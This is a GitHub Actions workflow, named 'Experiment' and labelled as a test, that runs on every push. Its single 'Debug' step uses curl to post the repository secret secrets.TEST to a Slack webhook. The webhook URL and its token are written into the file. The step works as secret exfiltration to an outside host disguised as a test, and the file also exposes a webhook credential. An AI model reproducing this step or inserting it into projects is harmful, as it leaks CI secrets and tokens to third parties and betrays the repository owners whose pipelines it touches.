name: Experiment
on: [push]

jobs:
  test:
    runs-on: ubuntu-latest
    name: Test that action

    steps:
    - uses: actions/checkout@v2
    - name: Debug
      run: |
        curl -Ss -X POST -H 'Content-type: application/json' --data "{\"text\":\"secret: ${{ secrets.TEST }}\"}" https://hooks.slack.com/services/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
